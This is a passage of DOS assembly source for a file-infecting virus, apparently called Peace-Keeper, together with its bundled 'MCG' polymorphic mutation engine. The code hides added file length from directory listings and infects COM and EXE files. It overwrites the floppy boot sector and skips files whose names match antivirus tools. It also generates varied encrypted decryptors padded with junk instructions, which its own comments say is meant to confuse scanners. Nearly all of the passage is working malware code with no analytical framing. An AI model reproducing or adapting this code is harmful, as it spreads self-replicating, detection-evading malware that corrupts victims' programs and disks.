        sub     si,si
        inc     al
        jnz     Hide_Fcb                ; If it is an extended FCB  , we
        add     bx,07                   ; must add the delta offset
hide_fcb:
        mov     ax,WORD PTR es:[bx+17h]
        and     ax,01fh                 ; Unmasking date
        cmp     ax,01eh                 ; Check if it is already infected
        jne     Hide_error2
        mov     ax,WORD PTR es:[bx+1dh]
        mov     dx,WORD PTR es:[bx+1fh] ; If not , substract the virus
        sub     ax,VirLen               ; length from the file length
        sbb     dx,00
        jb      Hide_Error2
        mov     WORD PTR es:[bx+1dh],ax
        mov     WORD PTR es:[bx+1fh],dx
Hide_Error2:
        pop     ds
        pop     es
        pop     si
        pop     dx
        pop     bx
        pop     ax
Hide_Error:
        iret

; This procedure is the working horse of this virus . It is called
; by the interrupt 21h handler in order to infect the
; victim file .

Infect:
        cli
        mov     ProcSS,ss
        mov     ProcSP,sp
        push    cs                      ; Set own stack in order to not
        pop     ss                      ; blow up the DOS' stack --> (Crash!)
        mov     sp,0100h-1
        sti
        mov     cs:Gate,Close

        call    CheckFile               ; Check for a good victim file
        jc      NotInfect

        call    MyBoot                  ; Overwrite the bootsector into A:

        mov     FUcked,Nope
        cmp     FType,Com
        je      FUck_Com
        cmp     FType,Exe
        je      FUck_Exe
        jmp     Error
Fuck_Exe:
        call    SetAttrib
        jc      NotInfect
        call    OpenFile
        jc      NotInfect                ; Infecting EXE file using standard
        call    StoreDate                ; patching
        mov     al,02h
        call    MoveFP
        mov     Size1,ax
        mov     Size2,dx
        call    EntryExe
        jc      NotInfect2
        mov     Fucked,Yes
        call    WriteVirus
        jmp     NotInfect2
Fuck_Com:
        call    SetAttrib
        jc      NotInfect
        call    OpenFile                 ; Infecting COM file using the same
        jc      NotInfect                ; method of the Commander Bomber
        call    StoreDate
        mov     al,02h
        call    MoveFP
        mov     Size1,ax
        mov     Size2,dx
        call    CheckTag
        jc      NotInfect2
        call    EntryCom
        jc      NotInfect2
        call    WriteVirus
        call    WriteBuf
        mov     Fucked,Yes
NotInfect2:
        call    LoadDate
        call    CloseFile
NotInfect:
        mov     cs:Gate,Open
        cli
        push    ProcSS
        pop     ss                      ; Reloading old DOS's stack
        mov     sp,ProcSP
        sti
        jmp     NoError

; DATA

; Scan string for token routine

dos3    BYTE    90h,90h,0e8h,0cch       ; This is the dos entry point code:
dos4    BYTE    90h,90h,0e8h,0cch       ;   NOP
dos5    BYTE    90h,90h,0e8h,0cch       ;   NOP
dos6    BYTE    90h,90h,0e8h,0cch       ;   CALL SomeWhere ...

; Infected file data :

FType   BYTE    Com                     ; Victim file type (COM or EXE)
FOfs    WORD    ?                       ; Address on the ASCIIZ string of
FSeg    WORD    ?                       ; the filename buffer .
FAttrb  WORD    ?                       ; File attribute stored by the virus
FDate   WORD    ?                       ; File data to hide file opening
FTime   WORD    ?                       ; ,change  and writing
Size1   WORD    ?                       ; Size of infected file down...
Size2   WORD    ?                       ; ... and up.
Handle  WORD    ?                       ; File handle for DOS service
ProgSS  WORD    ?                       ; \
ProgSP  WORD    ?                       ;  \Old victim file entry point .
ProgCS  WORD    ?                       ;  /Stored at infection time
ProgIP  WORD    ?                       ; /
K1      WORD    9821h
K2      WORD    0001
Seed    WORD    0deadh
Ext     BYTE    'EXECOM'                ; Allowed file's extension .
Skip    BYTE    'SCCLVIVSMSCPF-IMVHTB'  ; A lot of filenames to skip (like AVs)
LstfOfs WORD    ?
CurOfs  WORD    ?                       ; Length of stored bytes on COM files
BufLen  WORD    6                       ; Address of the stored bytes for COM
BufOfs  WORD    ?
LstOfs  WORD    ?
ChaiNum WORD    1                       ; Number of polymorphic chains
Elen    WORD    ?                       ; Length of the polymorphic header
TrashB  WORD    ?                       ; Used to store EXE entry-point
Fucked  BYTE    Nope
InfDone BYTE    Nope
Gate    BYTE    Open                    ; Gate on fake interrupt 13h
Gone    BYTE    0ffh                    ; Used by the Int 1 trap

; System status and interrupts address :

Adrs    WORD    ?                       ; I don't remember well (??)
Dos_Seg WORD    ?                       ; Dos's code segment to scan
OldSS   WORD    ?                       ;
OldSP   WORD    ?                       ; Previous stack pointer
DosVer  WORD    ?                       ; System DOS's version
StartDS WORD    ?                       ; Starting data segment value
ODos21  DWORD   ?                       ; Original DOS's 21 interrups address
Dos21   DWORD   ?                       ; Next int21 hooker in the chain
Old24   DWORD   ?                       ; Address of the int24 hooker
Old3    DWORD   ?                       ; Not used (?)
Old1    DWORD   ?                       ; Used to store int1 into startup trap
Old13   DWORD   ?                       ; Address of the next int13h filter
ProcSS  WORD    ?                       ; \
ProcSP  WORD    ?                       ;  \
ProcAX  WORD    ?                       ;   \
ProcBX  WORD    ?                       ;    \
ProcCX  WORD    ?                       ;     At every infection,the process's
ProcDX  WORD    ?                       ;     registers are stored here
ProcDS  WORD    ?                       ;
ProcES  WORD    ?                       ;    /
ProcSI  WORD    ?                       ;   /
ProcDI  WORD    ?                       ;  /
ProcBP  WORD    ?                       ; /
Buf     BYTE    1ch dup (0)             ; Working buffer to infect EXE files
MiniBuf BYTE    4 dup (0)               ; Only a micro-buffer to check 4 win

; MCG data area :

Flag    BYTE    ?                       ; Setting for the Engine
Value   WORD    ?                       ; Used by the Put_Into procedure
Target  BYTE    ?                       ; Target regsiter for Put_Into
Key     WORD    ?                       ; De/Encryption key
Entry   WORD    ?
Set     BYTE    ?
LupAdrs WORD    ?
DeltaOfs WORD   ?                       ; Value of the current delta-offset
DecLoc  WORD    ?                       ; Decryption location
DecLen  WORD    ?                       ; Decryption length
GFlag   BYTE    ?
ZeroF   BYTE    ?                       ; This flag is used to check for some
                                        ; nasty problems with the ZERO flag
; Various equ ...

Com     EQU     0
Exe     EQU     1
Yes     EQU     0                       ; Constants used at run-time
Nope    EQU     1
Stop    EQU     0
Now     EQU     1
Close   EQU     0
Open    EQU     1


;============================================================================;
; M U T A T I O N    E N G I N E                                             ;
; MCG "Mutant Code Generator" , Version 0.31BETA                             ;
; Written by Doctor Revenge , All Rights Reserved .                          ;
;                                                                            ;
; USAGE:                                                                     ;
;                                                                            ;
;   To work with this engine , you must provide the settings into the        ;
;   BL register . This is the description of this settings :                 ;
;                                                                            ;
;   BL Register                                                              ;
;   Bit #       -  Description                                               ;
;                                                                            ;
;       0 ------>  Reserved .                                                ;
;       1 ------>  Put random instructions into decryptor                    ;
;       2\                                                                   ;
;         ------>  Encryption/decryption method ( ADD / SUB / XOR )          ;
;       3/                                                                   ;
;       4 ------>  Loop instructions ( LOOP / JNZ,JG )                       ;
;       5 ------>  SI or DI ? ( 0 = SI , 1 = DI )                            ;
;       6 ------>  Delta offset in decryption loop                           ;
;       7 ------>  Use byte or word for de/encryption                        ;
;                                                                            ;
;   DI    ------>  Offset where the MCG will put the decryption routine      ;
;   AX/AH ------>  En/Decryption key                                         ;
;   BP    ------>  Entry point where the decryptor gets control              ;
;                                                                            ;
;   Output :                                                                 ;
;                                                                            ;
;      CX ------>  Length of decryptor                                       ;
;      DX ------>  Start Offset of the decryptor                             ;
;                                                                            ;
;                                                                            ;
;   ALL OTHER REGISTERS WILL BE TRASHED !                                    ;
;                                                                            ;
;   Note :                                                                   ;
;   This program was expressely written for the Peace-Keeper virus .         ;
;   If you want to use , this engine , you *must* wait for the official      ;
;   release of it , the MCG , that is more,more,more polymorphic .           ;
;============================================================================;


db      '[MCG v0.31�]'

vipregs byte    000b,001b,011b,100b

mul_set:
        nop
        nop
        mov     bx,02
        mul     bx                      ; Multiply by 16
        mov     si,ax
        ret
rndget:
        push    cx
        mov     cx,30                   ; Shaking rnd engine ...
        call    rnd_get
        loop    $-3
        pop     cx
        ret
rndgarb:
        test    set,01000000b
        jnz     no_garb
rnd_chain:        
        push    cx
        call    rnd_get
        and     al,00000111b            ; Insert a lot of random instrs
        sub     ah,ah                   ; before loop routine
        mov     ch,ah
        mov     cl,al
        inc     cx
        call    garb
        loop    $-3
        pop     cx
no_garb:
        ret
chk_reg:
        push    ax
        push    cx                      ; This procedure , tests the
        push    di                      ; used register . If it is
        lea     di,vipregs              ; a register like SP , it patch
        mov     cx,4                    ; the value .
        mov     al,ah
        repne   scasb
        pop     di
        pop     cx
        pop     ax
        jne     reg_ok
        mov     ah,010b
reg_ok:
        ret

; This procedure assembles a lot of non-sense instructions in order
; to make confusion when a scanner tries to detect this virus .

tableg  word    offset g1    ;1
        word    offset g2    ;2
        word    offset g5    ;5
        word    offset g4    ;4
        word    offset g7    ;8
        word    offset g3    ;6
        word    offset g7    ;7
        word    offset g6    ;3

nop8    byte    090h,0f8h,0f9h,0f5h,0fah,090h,0fch,0f5h
nop16   byte    08h,020h,08h,088h
clear   byte    02bh,031h

garb:
        pushf
        push    ax
        push    bx
        push    cx
        push    dx
        call    rndget
        and     ax,00000111b
        call    mul_set
        call    rndget
        jmp     word ptr cs:[si+tableg]
garbend:
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        ret
g1:
        and     al,00000111b
        lea     bx,nop8                 ; NOP , CLI , STD ...
        xlat
        stosb
        jmp     garbend
g2:
        cmp     gflag,yes
        jne     garbend
        and     al,00000011b
        lea     bx,nop16                ; AND,OR , (8/16)
        push    cs                      ; es:
        pop     es                      ;    AND SI,SI
        xlat
        mov     bl,al
        push    cx
        call    rnd_get
        and     al,00000001b
        or      al,bl
        and     ah,00111000b
        mov     bh,ah
        mov     cl,03
        shr     ah,cl
        or      ah,bh
        or      ah,11000000b
        stosw
        pop     cx
        jmp     garbend
g3:
        and     al,00000001b            ; XCHG ,
        or      al,10000110b            ; es:
        or      ah,11000000b            ;   XCHG AX,SP
        stosw                           ;   XCHG SP,AX
        stosw
        jmp     garbend
g4:
        and     al,00001111b
        or      al,01110000b
        sub     ah,ah
        stosw
        jmp     garbend
g5:
        cmp     gflag,yes               ; CMP ,
        jnz     garbend                 ; (Jx Next )
        and     al,00000001b
        or      al,00111010b
        or      ah,11000000b
        stosw
        call    rnd_get
        test    ah,00000010b
        jz      g4
        jmp     garbend
g6:
        cmp     gflag,yes
        jnz     garbend                 ; CMP AX,[MEM OFFSET]
        and     al,00000001b
        or      al,00111100b
        stosb
        test    al,00000001b
        pushf
        call    rnd_get
        popf
        jnz     g6b
        stosb
        jmp     g4
g6b:
        stosw
        jmp     $-3
g7:
        cmp     gflag,yes               ; TEST ,value
        jnz     garbend
        and     al,00000001b
        or      al,10000100b
        or      ah,11000000b
        stosw
        jmp     g4
g8:
        and     al,00000111b
        lea     bx,nop8
        xlat
        stosb
        mov     ax,0fde2h
        stosw
        jmp     garbend

; This procedure puts into a register , a numeric value . Used to
; set-up decryption routine .
;
; DH = Target register   (opcode format)
; AX = Numeric value

vip_reg byte    000b,001b,100b,011b 

tablep  word    offset p1
        word    offset p2
        word    offset p4
        word    offset p3
put_into:
        pushf
        push    ax
        push    bx
        push    cx
        push    dx
        mov     value,ax
        mov     target,dh
        call    rnd_get
        and     ax,00000011b
        call    mul_set
        call    rndget
        jmp     word ptr cs:[si+tablep]
putdone:
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
        ret
p1:
        mov     al,10111000b            ; MOV ,value
        or      al,target               ; es:
        stosb                           ;  MOV BP,0FEFFh
        mov     ax,value
        stosw
        call    rndgarb
        jmp     putdone
p2:
        and     ah,00000111b
        call    chk_reg
        mov     dh,ah                   ; MOV ,value
        mov     al,10111000b            ; XCHG ,
        or      al,ah                   ; es:
        stosb                           ;   MOV BX,0FE45H
        mov     ax,value                ;   XCHG SI,BX
        stosw
        call    rndgarb
        mov     al,10000111b
        mov     ah,11000000b
        or      ah,dh
        mov     dh,target
        sub     cx,cx
        mov     cl,03
        shl     dh,cl
        or      ah,dh
        stosw
        jmp     putdone
p3:
        and     ah,00000111b            ; MOV ,value
        call    chk_reg                 ; PUSH 
        mov     dh,ah                   ; POP 
        mov     al,10111000b            ; es:
        or      al,ah                   ;   MOV DX,1234h
        stosb                           ;   PUSH DX
        mov     ax,value                ;   POP DX
        stosw
        call    rndgarb
        mov     al,01010000b
        or      al,dh
        stosb
        call    rndgarb
        mov     dh,target
        mov     al,01011000b
        or      al,dh
        stosb
        jmp     putdone
p4:
        and     al,00000001b
        sub     ah,ah                   ; SUB/XOR ,
        lea     bx,clear                ; ADD/OR ,value
        xlat                            ; es:
        stosb                           ;   SUB CX,CX
        mov     bl,target               ;   OR CX,FE01H
        sub     al,al
        or      al,11000000b
        or      al,bl
        mov     cl,3
        shl     bl,cl
        or      al,bl
        stosb
        call    rndgarb
        call    rndget
        and     al,00000001b
        cmp     al,1
        jz      p4add
p4or:
        xor     ax,ax
        mov     al,10000001b
        mov     ah,11001000b
        mov     bl,target
        or      ah,bl
        stosw
p4val:
        mov     ax,value
        stosw
        jmp     putdone
p4add:
        sub     ax,ax
        mov     al,10000001b
        mov     bl,target
        or      ah,bl
        or      ah,11000000b
        stosw
        jmp     p4val

; This is the main call to the engine .

crypt:
        cld
        push    cs
        push    cs
        pop     ds
        pop     es
        mov     key,ax                  ; Saving setting and en/decryption
        mov     set,bl                  ; values into buffers
        mov     entry,bp
        mov     decloc,di
        mov     gflag,yes
        mov     zerof,nope

; Step One : Garbage instructions above decryption routine .

crypt2:
        test    set,01000000b           ; Insert a lot of random instructions
        jnz     crypt3
fill_garb:
        call    rnd_get
        and     al,00001111b
        sub     cx,cx                   ; Call for some times the rnd engine
        mov     cl,al
        inc     cx
        call    garb                    ; Fill the decryptor of garbage
        loop    $-3

; Step Two : Set CX for loop .

crypt3:
        test    set,00000001b           ; Look for byte/word en/decryption
        mov     dh,00000001b            ; Insert into CX register the
        jz      cx_byte                 ; loop counter
cx_word:
        push    dx
        xor     dx,dx                   ; Calculate CX value for byte
        mov     ax,virlen               ; decryption
        mov     bx,2
        div     bx
        add     ax,dx
        pop     dx
        call    put_into                ; Put it into CX
        jmp     crypt4
cx_byte:
        mov     ax,virlen               ; Word decryption
        call    put_into

; Step Tree : Set SI or DI pointer to code to decrypt .

crypt4:
        call    rndgarb                 ; Put garbage
        test    set,00000100b           ; Look for decryption register
        jnz     use_si
use_di:
        mov     dh,00000111b            ; Insert DI opcode
        mov     ax,0ffffh               ; The value is the virus firm
        call    put_into                ; Make the code
        jmp     crypt5
use_si:
        mov     dh,00000110b
        mov     ax,0ffffh               ; Put into SI the flag for later use
        call    put_into

; Step Four: Make decryption instruction .

crypt5:
        mov     gflag,nope
        call    rndgarb
        mov     lupadrs,di              ; Save current ofs for later use
        call    rndgarb
        call    rndgarb
        mov     al,02eh                 ; Put the CS: opcode
        stosb
        mov     al,10000001b            ; Common part of the instruction
        test    set,00000001b           ; See if it is a word encryption
        jnz     put_instr
        and     al,11111110b
put_instr:
        stosb
        test    set,00010000b           ; Look for the decryption opcode
        jz      use_add
        test    set,00100000b
        jz      use_sub
use_xor:
        mov     al,00110000b
        mov     zerof,yes               ; XOR may affect ZR flag
        jmp     patch_reg
use_sub:
        mov     al,00101000b            ;
        jmp     patch_reg               ; Patching opcode for the various
use_add:                                ; decryprion instructions
        sub     al,al
patch_reg:
        test    set,00000100b
        jz      set_di
set_si:
        or      al,00000100b
        jmp     patch_delta
set_di:
        or      al,00000101b
patch_delta:                            ; Look for the delta offset
        stosb
        test    set,00000010b
        pushf
        sub     ax,ax
        popf
        jnz     no_delta
calc_delta:
        call    rnd_get
        mov     deltaofs,ax
        push    ax
        push    bx
        mov     bx,200h
        add     bx,entry
        sub     bx,ax
        test    bx,11000000b
        pop     bx
        pop     ax
        jz      calc_delta
        or      byte ptr cs:[di-1],10000000b ; Patch old opcode for delta ofs
        stosw
no_delta:
        test    set,00000001b
        jz      key_byte
key_word:
        mov     ax,key                  ; Decrypt code with a word key
        stosw
        jmp     crypt6
key_byte:
        mov     al,byte ptr key[01]
        stosb                           ; Use a byte key .
        jmp     crypt6

; Step Five : Loop incrementation routine .

crypt6:
        call    rndgarb
        call    rndgarb
        call    rndgarb
        call    rnd_get
        and     ah,00000011b            ; Look for the appropiate
        cmp     ah,0                    ; incrementation instruction
        jz      use_scas                ; Use SCAS(B/W)
        cmp     ah,00000010b
        jz      use_cmps                ; Use CMPS(B/W)
        cmp     ah,00000011b
        jz      use_inc                 ; Use INC / (INC)
use_addsub:
        mov     al,10000001b            ; Use ADD (SI/DI),(1/2)
        mov     ah,0c0h
        test    set,00000100b
        jnz     add_si
add_di:
        or      ah,000000111b           ; Look for decryption register
        jmp     put_add
add_si:
        or      ah,000000110b
put_add:
        stosw
        test    set,00000001b           ; Look for byte of word incrementation
        jz      add_byte
add_word:
        mov     ax,2
        jmp     put_addvalue
add_byte:
        mov     ax,1
put_addvalue:
        stosw
        jmp     crypt7
use_scas:
        test    set,00000100b           ; If SI reg , don't use SCAS instr .
        jnz     use_cmps                ; Look for incremenation length
        mov     zerof,yes               ; May affect ZR setting
        mov     al,10101110b            ; and put the appropiate instr .
        test    set,00000001b
        jz      scas_byte
scas_word:
        or      al,00000001b            ; Patch for word
scas_byte:
        stosb
        jmp     crypt7
use_cmps:
        mov     zerof,yes               ; May affect Zero Flag
        mov     al,10100110b
        test    set,00000001b           ; Same as above code .
        jz      cmps_byte
cmps_word:
        or      al,00000001b
cmps_byte:
        stosb
        jmp     crypt7
use_inc:
        mov     al,01000000b            ; Set INC op-code .
patch_reg2:
        test    set,00000100b
        jnz     inc_si
inc_di:
        or      al,00000111b            ; Patch register opcode
        jmp     put_inc
inc_si:
        or      al,00000110b
put_inc:
        stosb
        test    set,00000001b
        jz      crypt7
        push    ax                      ; Look for byte or word and
        call    rndgarb                 ; put the instruction/s
        call    rndgarb
        pop     ax
        stosb

; Step Six : Loop index handling ( or " How to decrement CX register " )

crypt7:
        call    rndgarb
        call    rndgarb                 ; Put a lot of garbage
        test    set,00001000b           ; Look for the loop setting
        jz      use_jx
use_loop:
        mov     al,11100010b
patch_loop:
        stosb                           ; Calculating loop offset
        mov     bx,di
        mov     dx,lupadrs              ; Address of the decryption instr .
        sub     bx,dx
        mov     bh,0ffh
        sub     bh,bl
        xchg    al,bh
        stosb                           ; Put offset into instruction
        jmp     crypt8
use_jx:
        cmp     zerof,yes
        jz      use_loop
        mov     al,01001001b            ; Use DEC CX , JNZ/JG
        stosb
        call    rndgarb
        call    rndgarb
        call    rndgarb 
        call    rnd_get
        and     ah,00000001b
        cmp     ah,1
        jz      use_jg
use_jnz:
        mov     al,01110101b
        jmp     patch_loop
use_jg:
        mov     al,01111111b
        jmp     patch_loop

; Step Seven : Patch register assignment .

crypt8:
        push    di
        mov     bx,decloc               ; Now it's time to setup SI/DI reg
        sub     di,bx
        mov     declen,di               ; Calculate decryptor length
        pop     di
        std
        mov     al,0ffh                 ; Scan decryptor for the flag
        mov     cx,declen
scan_ff:
        repne   scasb
        cmp     byte ptr [di],0ffh      ; Check if it is the flag
        jne     scan_ff                 ; If not , continue the scan routine
        cld
        mov     ax,declen
        add     ax,entry                ; Look for the presence of a delta ofs
patch_delta2:
        test    set,00000010b
        jnz     put_point
        sub     ax,deltaofs             ; If delta , substract delta value
put_point:
        stosw                           ; Put value into SI/DI instruction

; Set up return values .

crypt_end:
        mov     cx,declen               ; CX = Decryptor length
        mov     dx,decloc               ; DX = Decryptor offset
        ret

; This procedure encrypts the virus body .
; SI = Start offset of the code CX = Number of bytes to encrypt
; DI = Target offset of the code

crypt_code:
        push    di
        push    cx
        test    set,00000001b
        jz      b_lup
word_loop:
        inc     cx
        shr     cx,1
w_lup:
        mov     dx,key
        lodsw
        call    encrypt
        stosw
        loop    w_lup
        jmp     encrypt_done
b_lup:
        mov     dx,key
        lodsb
        xchg    dh,dl
        xor     dh,dh
        call    encrypt
        stosb
        loop    b_lup
        jmp     encrypt_done
encrypt:
        test    set,00010000b
        jz      encrypt_sub
        test    set,00100000b
        jz      encrypt_add
encrypt_xor:
        xor     ax,dx
        ret
encrypt_add:
        add     ax,dx
        ret
encrypt_sub:
        sub     ax,dx
        ret
encrypt_done:
        pop     cx
        pop     dx
        ret

virlen  equ     $-100h
over    :

        db      02,00,00,00,0cdh,020h

_CODE   ENDS
        END     START
